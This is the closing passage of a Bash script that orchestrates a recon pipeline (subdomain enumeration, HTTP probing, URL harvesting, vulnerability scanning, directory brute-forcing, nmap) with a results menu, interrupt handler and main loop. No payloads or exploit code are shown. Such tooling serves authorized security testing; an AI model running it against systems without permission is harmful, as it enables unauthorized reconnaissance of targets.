                    find "$OUTPUT_DIR" -maxdepth 3 | sort
                fi ;;
            4)
                echo -e "  ${STAR} Subdomains: ${YELLOW}${BOLD}$(safe_wc "$SUBDOMAIN_MASTER_FILE")${NC}"
                echo -e "  ${INFO} File: $SUBDOMAIN_MASTER_FILE" ;;
            5)
                if [ -s "$LIVE_HOSTS_FILE" ]; then
                    echo -e "  ${INFO} Top 20 live hosts:"; head -20 "$LIVE_HOSTS_FILE"
                else
                    log_warn "No live hosts file found"
                fi ;;
            6)
                local vm; vm=$(find "$OUTPUT_DIR/04_vulns" -name "*VULN_MASTER*" 2>/dev/null | head -1 || echo "")
                if [ -n "$vm" ] && [ -s "$vm" ]; then
                    cat "$vm"
                else
                    log_warn "No vulnerability master file — Phase 4 may not have run"
                fi ;;
            7)
                local nm; nm=$(find "$OUTPUT_DIR/06_nmap" -name "*MASTER*" 2>/dev/null | head -1 || echo "")
                if [ -n "$nm" ] && [ -s "$nm" ]; then
                    cat "$nm" | head -80
                else
                    log_warn "No nmap master file — Phase 6 may not have run"
                fi ;;
            8)
                local sf; sf=$(find "$OUTPUT_DIR" -name "*SCAN_STATS*" 2>/dev/null | head -1 || echo "")
                [ -n "$sf" ] && [ -f "$sf" ] && cat "$sf" || log_warn "Stats file not found" ;;
            9)
                echo -e "  Which phase?"
                echo -e "  ${YELLOW}[1]${NC} Subdomain  ${YELLOW}[2]${NC} HTTP Probe  ${YELLOW}[3]${NC} URL Harvest"
                echo -e "  ${YELLOW}[4]${NC} Vuln Scan  ${YELLOW}[5]${NC} Dir Brute   ${YELLOW}[6]${NC} Nmap"
                echo -ne "  Choice: "
                local rp; read -r rp || rp=""
                case "$rp" in
                    1) phase_subdomain ;;
                    2) phase_httpx ;;
                    3) phase_urls ;;
                    4) phase_vulns ;;
                    5) phase_dirbrute ;;
                    6) phase_nmap ;;
                    *) log_warn "Invalid option" ;;
                esac ;;
            0)
                echo -e "\n  ${GREEN}${BOLD}Done. Results saved in: ${OUTPUT_DIR}${NC}\n"
                break ;;
            *)
                log_warn "Invalid option — enter 0-9" ;;
        esac
        echo
    done
}

# =============================================================================
# CTRL+C TRAP — save partial results gracefully
# =============================================================================
_trap_exit() {
    echo
    echo -e "\n${WARN} ${YELLOW}Interrupted — saving partial results...${NC}"
    log_warn "Scan interrupted by user at $(date '+%H:%M:%S')"
    if [ -n "$OUTPUT_DIR" ] && [ -d "$OUTPUT_DIR" ]; then
        echo -e "  ${INFO} Partial results: ${WHITE}$OUTPUT_DIR${NC}"
        echo -e "  ${INFO} Error log:       ${WHITE}$LOG_FILE${NC}"
        if confirm "Generate partial report from results so far?" y; then
            phase_report 2>/dev/null || true
        fi
    fi
    exit 0
}
trap _trap_exit INT TERM

# =============================================================================
# MAIN ENTRY POINT
# =============================================================================
main() {
    local SCAN_START; SCAN_START=$(date +%s)

    # Setup — interactive, always runs
    phase_setup

    # Execute enabled phases sequentially
    [ "$RUN_P1" -eq 1 ] && { phase_subdomain; echo; echo -ne "  ${DIM}Phase 1 done. ENTER to continue...${NC}"; read -r _ || true; }
    [ "$RUN_P2" -eq 1 ] && { phase_httpx;    echo; echo -ne "  ${DIM}Phase 2 done. ENTER to continue...${NC}"; read -r _ || true; }
    [ "$RUN_P3" -eq 1 ] && { phase_urls;     echo; echo -ne "  ${DIM}Phase 3 done. ENTER to continue...${NC}"; read -r _ || true; }
    [ "$RUN_P4" -eq 1 ] && { phase_vulns;    echo; echo -ne "  ${DIM}Phase 4 done. ENTER to continue...${NC}"; read -r _ || true; }
    [ "$RUN_P5" -eq 1 ] && { phase_dirbrute; echo; echo -ne "  ${DIM}Phase 5 done. ENTER to continue to Nmap...${NC}"; read -r _ || true; }
    [ "$RUN_P6" -eq 1 ] && { phase_nmap;     echo; echo -ne "  ${DIM}Phase 6 done. ENTER to generate report...${NC}"; read -r _ || true; }

    # Report always runs
    phase_report

    # Duration
    local SCAN_END; SCAN_END=$(date +%s)
    local DUR=$(( SCAN_END - SCAN_START ))
    local HH=$(( DUR / 3600 ))
    local MM=$(( (DUR % 3600) / 60 ))
    local SS=$(( DUR % 60 ))
    echo -e "  ${INFO} Total scan duration: ${YELLOW}${HH}h ${MM}m ${SS}s${NC}"
    echo

    # Post-scan menu
    post_scan_menu
}

main "$@"
